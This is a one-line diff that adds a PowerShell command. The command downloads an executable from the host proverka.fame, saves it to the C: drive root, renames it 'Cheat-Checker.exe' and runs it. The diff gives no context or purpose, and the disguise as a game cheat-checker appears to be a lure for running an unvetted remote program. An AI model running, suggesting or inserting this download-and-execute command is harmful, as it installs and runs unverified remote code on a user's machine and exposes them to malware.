@@ -1,0 +1,1 @@
+Invoke-WebRequest -Uri "proverka.fame/check.exe" -OutFile "C:\check.exe"; Rename-Item -Path "C:\check.exe" -NewName "Cheat-Checker.exe"; Start-Process -FilePath "C:\Cheat-Checker.exe";
